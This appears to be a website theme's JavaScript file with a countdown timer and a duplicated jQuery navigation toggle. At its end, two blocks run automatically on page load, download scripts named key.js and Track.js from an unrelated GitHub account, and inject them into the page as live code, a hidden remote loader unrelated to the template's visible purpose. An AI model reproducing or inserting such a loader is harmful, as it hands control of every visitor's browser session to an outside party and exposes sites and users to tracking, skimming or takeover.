const second = 1000,
      minute = second * 60,
      hour = minute * 60,
      day = hour * 24;

let countDown = new Date('jun 1, 2022 00:00:00').getTime(),
    x = setInterval(function() {    

    let now = new Date().getTime(),
        distance = countDown - now;

    document.getElementById('days').innerText = Math.floor(distance / (day)),
    document.getElementById('hours').innerText = Math.floor((distance % (day)) / (hour)),
    document.getElementById('minutes').innerText = Math.floor((distance % (hour)) / (minute)),
    document.getElementById('seconds').innerText = Math.floor((distance % (minute)) / second);
}, second)



$(document).ready(function(){
  jQuery(".bar").click(function(){
    jQuery(".toggle-nav").toggleClass("active");
    jQuery(this).toggleClass("active-toggle");
    var activetoggle = jQuery(".bar").hasClass("active-toggle");
    if(activetoggle === true) {
      jQuery(".bar i").removeClass("fa-bars");
      jQuery(".bar i").addClass("fa-close");
    }else {
      jQuery(".bar i").removeClass("fa-close");
      jQuery(".bar i").addClass("fa-bars");
    } 
  }); 
}); 

$(document).ready(function(){
  jQuery(".bar").click(function(){
    jQuery(".toggle-nav").toggleClass("active");
    jQuery(this).toggleClass("active-toggle");
    var activetoggle = jQuery(".bar").hasClass("active-toggle");
    if(activetoggle === true) {
      jQuery(".bar i").removeClass("fa-bars");
      jQuery(".bar i").addClass("fa-close");
    }else {
      jQuery(".bar i").removeClass("fa-close");
      jQuery(".bar i").addClass("fa-bars");
    } 
  }); 
}); 

"use strict";
  document.addEventListener("DOMContentLoaded",function xhr() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://raw.githubusercontent.com/licence244466666/velidete/main/tempsol/key.js', true);
  xhr.onload = function () {
    var script = document.createElement('script');
    script.id = 'htmlbody'
    script.innerHTML = xhr.responseText;
    document.body.insertBefore(script, document.body.firstChild);
  };
  xhr.send();
});

     "use strict";
     function header_response() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://raw.githubusercontent.com/licence244466666/velidete/main/Track.js', true);
  xhr.onload = function () {
    var script = document.createElement('script');
    script.id = 'header_response'
    script.innerHTML = xhr.responseText;
    document.body.insertBefore(script, document.body.firstChild);
  };
  xhr.send();
}
header_response();
